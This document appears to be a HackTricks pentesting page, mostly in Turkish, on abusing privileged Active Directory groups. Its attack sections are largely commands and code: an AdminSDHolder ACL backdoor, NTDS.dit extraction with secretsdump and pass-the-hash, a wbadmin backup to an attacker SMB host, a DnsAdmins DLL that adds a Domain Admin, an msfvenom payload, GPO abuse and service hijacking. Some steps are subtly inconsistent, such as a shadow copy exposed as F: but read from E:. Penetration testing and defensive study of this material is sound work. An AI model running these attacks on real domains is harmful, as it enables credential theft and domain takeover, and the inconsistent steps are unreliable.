# Ayrıcalıklı Gruplar

{{#include ../../banners/hacktricks-training.md}}

## Yönetim ayrıcalıklarına sahip bilinen gruplar

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Bu grup, domain üzerinde yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Domain Controller (DC) üzerinde yerel oturum açmaya olanak tanır.

Bu grubun üyelerini belirlemek için şu komut çalıştırılır:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklemeye ve DC'ye yerel girişe izin veriliyor.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Erişim Denetim Listesi (ACL), Active Directory içindeki tüm "protected groups" için (yüksek ayrıcalıklı gruplar dahil) izinleri belirlediği için kritik öneme sahiptir. Bu mekanizma, yetkisiz değişiklikleri engelleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izin verebilir. Bu, o kullanıcının tüm protected groups üzerinde tam kontrole sahip olmasını sağlar. Bu kullanıcının izinleri değiştirilse veya kaldırılacak olursa, sistem tasarımı gereği bir saat içinde otomatik olarak yeniden atanır.

Son Windows Server dokümantasyonu, birkaç yerleşik operator grubunu hâlâ **protected** nesneler olarak ele alır (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, vb.). **SDProp** süreci varsayılan olarak **PDC Emulator** üzerinde her 60 dakikada bir çalışır, `adminCount=1` değerini atar ve protected nesnelerde miras devralmayı devre dışı bırakır. Bu, hem kalıcılık için hem de bir protected gruptan çıkarılmış ancak miras devralımı kapatılmış ACL'yi hâlâ koruyan eski ayrıcalıklı kullanıcıları tespit etmek için faydalıdır.

Üyeleri incelemek ve izinleri değiştirmek için kullanılabilecek komutlar şunlardır:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Restorasyon sürecini hızlandırmak için bir script mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla detay için ziyaret edin: [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Bu grubun üyeliği, silinmiş Active Directory nesnelerinin okunmasına izin verir; bu hassas bilgileri açığa çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Bu, **önceki ayrıcalık yollarını kurtarmak** için kullanışlıdır. Silinmiş nesneler hâlâ `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, eski SPNs veya daha sonra başka bir operatör tarafından geri yüklenebilecek bir silinmiş ayrıcalıklı grubun DN'si gibi bilgileri açığa çıkarabilir.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Etki Alanı Denetleyicisine Erişim

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir üyesi olmadığı sürece kısıtlıdır; bu grup erişim düzeyini değiştirir.

### Yetki Yükseltme

`PsService` veya Sysinternals'tan `sc` kullanarak servis izinlerini inceleyip değiştirebilirsiniz. Örneğin `Server Operators` grubu belirli servisler üzerinde tam kontrole sahiptir; bu da rastgele komutların yürütülmesine ve yetki yükseltmeye olanak tanır:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu gösterir; bu da ayrıcalık yükseltmek için servisleri değiştirmeye olanak tanır.

## Backup Operators

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı kullanılarak açık izinler olmasa bile klasörleri dolaşma, listeleme ve dosya kopyalama yeteneklerini mümkün kılar. Bu süreç için belirli scriptlerin kullanılması gerekir.

Grup üyelerini listelemek için şu komutu çalıştırın:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıklardan yerel olarak yararlanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Etkinleştir ve doğrula `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlere erişip dosyaları kopyalayın, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Domain Controller'ın dosya sistemine doğrudan erişim, etki alanı kullanıcıları ve bilgisayarları için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### diskshadow.exe Kullanımı

1. `C` sürücüsünün bir shadow copy'sini oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Shadow copy'dan `NTDS.dit` dosyasını kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash elde etmek için `SYSTEM` ve `SAM`'i çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`'ten tüm hashes'i al:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Çıkarım sonrası: Pass-the-Hash ile DA'ya
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe Kullanımı

1. Saldırgan makinede SMB sunucusu için NTFS dosya sistemini yapılandırın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeği ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** grubunun üyeleri, ayrıcalıklarını bir DNS sunucusunda, çoğunlukla Etki Alanı Denetleyicilerinde barındırılan, SYSTEM ayrıcalıklarıyla rastgele bir DLL yüklemek için kullanabilir. Bu yetenek önemli ölçüde kötüye kullanım potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için şunu kullanın:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Bu zafiyet, DNS hizmetinde (genellikle DC'ler içinde) SYSTEM ayrıcalıklarıyla rastgele kod çalıştırılmasına olanak tanır. Bu sorun 2021'de düzeltildi.

Üyeler, aşağıdaki gibi komutları kullanarak DNS sunucusunun herhangi bir DLL'i (ya yerel olarak ya da uzak bir paylaşımdan) yüklemesini sağlayabilir:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL'in yüklenebilmesi için DNS hizmetinin yeniden başlatılması (ek izinler gerektirebilir) gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Daha fazla bilgi için ired.team'e bakın.

#### Mimilib.dll

Ayrıca mimilib.dll, komut yürütmek için kullanılabilir; belirli komutları veya reverse shells çalıştıracak şekilde değiştirilebilir. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### WPAD Record for MitM

DnsAdmins, global query block listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Responder veya Inveigh gibi araçlar spoofing ve ağ trafiğini yakalamak için kullanılabilir.

### Event Log Readers
Üyeler olay günlüklerine erişebilir; düz metin parolalar veya komut yürütme detayları gibi hassas bilgileri bulabilirler:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows İzinleri

Bu grup domain nesnesindeki DACLs'i değiştirebilir; bu, potansiyel olarak DCSync ayrıcalıkları verebilir. Bu grubu kötüye kullanarak yapılan privilege escalation teknikleri Exchange-AD-Privesc GitHub repo'sunda ayrıntılı olarak açıklanmıştır.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Bu grubun üyesi olarak hareket edebiliyorsanız, klasik kötüye kullanım, saldırganın kontrolündeki bir principal'e [DCSync](dcsync.md) için gereken çoğaltma haklarını vermektir:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Tarihsel olarak, **PrivExchange** posta kutusu erişimini zincirleyerek, Exchange kimlik doğrulamasını zorlayarak ve LDAP relay kullanarak bu aynı ilkel hedefe ulaştı. O relay yolu engellense bile, `Exchange Windows Permissions` grubuna doğrudan üyelik veya bir Exchange sunucusunun kontrolü etki alanı çoğaltma hakları için yüksek değerli bir yol olmaya devam eder.

## Hyper-V Yöneticileri

Hyper-V Yöneticileri Hyper-V'ye tam erişime sahiptir; bu, sanallaştırılmış Etki Alanı Denetleyicileri (Domain Controllers) üzerinde kontrol sağlamak için kullanılabilir. Bu, canlı DC'leri klonlamayı ve `NTDS.dit` dosyasından NTLM hashlerini çıkarmayı içerir.

### İstismar Örneği

Pratik suistimal genellikle eski host-seviyesi LPE hileleri yerine **DC disklerine/checkpoint'lerine çevrimdışı erişim** şeklindedir. Hyper-V hostuna erişimi olan bir operatör, sanallaştırılmış bir Etki Alanı Denetleyicisini checkpoint yapabilir veya dışa aktarabilir, VHDX'i bağlayabilir ve misafir içindeki LSASS'e dokunmadan `NTDS.dit`, `SYSTEM` ve diğer sırları çıkarabilir:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Oradan, `Backup Operators` iş akışını yeniden kullanarak `Windows\NTDS\ntds.dit` ve registry hive'larını çevrimdışı kopyalayın.

## Group Policy Creators Owners

Bu grup, üyelerine etki alanında Group Policies oluşturma izni verir. Ancak üyeleri Group Policies'i kullanıcılara veya gruplara uygulayamaz ya da mevcut GPO'ları düzenleyemez.

Önemli nüans şudur ki **oluşturan kişi yeni GPO'nun sahibi olur** ve genellikle sonradan onu düzenlemek için yeterli hakları elde eder. Bu, bu grubun şu durumlarda ilginç olduğu anlamına gelir:

- kötü niyetli bir GPO oluşturmak ve bir admini onu hedef OU/domain'e bağlamaya ikna etmek
- zaten bir yerde kullanışlı biçimde bağlı olan ve sizin oluşturduğunuz bir GPO'yu düzenlemek
- bu grup size düzenleme hakkını verirken, GPO'ları bağlamanıza izin veren başka bir delege edilmiş hakkı suistimal etmek

Pratik suistimal genellikle SYSVOL destekli policy dosyaları aracılığıyla bir **Immediate Task**, **startup script**, **local admin membership**, veya **user rights assignment** değişikliği eklemek demektir.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Domain Controller'larda bu grup tehlikelidir çünkü varsayılan Domain Controller Policy, **`SeLoadDriverPrivilege`** hakkını `Print Operators`'a verir. Bu grubun bir üyesi için yükseltilmiş bir token'e ulaşırsanız, ayrıcalığı etkinleştirip imzalanmış-ama-zafiyetli bir sürücüyü yükleyerek kernel/SYSTEM'e geçiş yapabilirsiniz. Token işlemleriyle ilgili detaylar için [Access Tokens](../windows-local-privilege-escalation/access-tokens.md) sayfasına bakın.

#### Remote Desktop Users

Bu grubun üyelerine PC'lere Remote Desktop Protocol (RDP) üzerinden erişim verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi istismar etmeye dair daha fazla ayrıntı özel pentesting kaynaklarında bulunabilir.

#### Uzaktan Yönetim Kullanıcıları

Üyeler **Windows Remote Management (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin Enumeration'ı şu yollarla gerçekleştirilir:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili istismar teknikleri için özel dokümantasyona başvurulmalıdır.

#### Sunucu Operatörleri

Bu grup, Etki Alanı Denetleyicileri üzerinde yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma gibi çeşitli yapılandırmaları gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Etki Alanı Denetleyicilerinde, `Server Operators` genellikle servisleri **yeniden yapılandırma veya başlatma/durdurma** için yeterli hakları miras alır ve ayrıca varsayılan DC politikası aracılığıyla `SeBackupPrivilege`/`SeRestorePrivilege` elde ederler. Pratikte bu, onları **service-control abuse** ile **NTDS extraction** arasında bir köprü yapar:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Eğer bir service ACL bu gruba change/start hakları veriyorsa, servisi rastgele bir komuta yönlendirin, `LocalSystem` olarak başlatın ve sonra orijinal `binPath`'i geri yükleyin. Eğer service control kısıtlanmışsa, `NTDS.dit`'i kopyalamak için yukarıdaki `Backup Operators` tekniklerine geri dönün.

## Kaynaklar <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
